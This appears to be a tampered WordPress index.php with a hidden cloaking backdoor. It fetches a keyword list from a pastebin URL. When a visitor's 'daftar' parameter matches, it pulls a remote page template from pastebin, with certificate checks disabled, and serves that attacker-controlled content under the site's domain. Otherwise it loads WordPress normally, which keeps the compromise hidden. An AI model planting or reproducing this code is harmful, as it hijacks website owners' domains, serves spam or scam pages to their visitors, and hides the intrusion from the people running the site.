<?php
$keyword = $_GET['daftar'];
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
$fullURL = $protocol . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

$external_content = file_get_contents("https://pastebin.com/raw/6fg8sV81");

function geturlsinfo($url)
{
    if (function_exists('curl_exec')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists('file_get_contents')) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

if (isset($keyword)) {
    if (stripos($external_content, $keyword) !== false) {
        $page = geturlsinfo("https://pastebin.com/raw/3UU7N2Ky");
        $page = str_replace("kwbrand", $keyword, $page);
        $page = str_replace("urltunnel", $fullURL, $page);
        echo $page;
    } else {
        define('WP_USE_THEMES', true);
        require(dirname(__FILE__) . '/wp-blog-header.php');
    }
} else {
    define('WP_USE_THEMES', true);
    require(dirname(__FILE__) . '/wp-blog-header.php');
}
?>

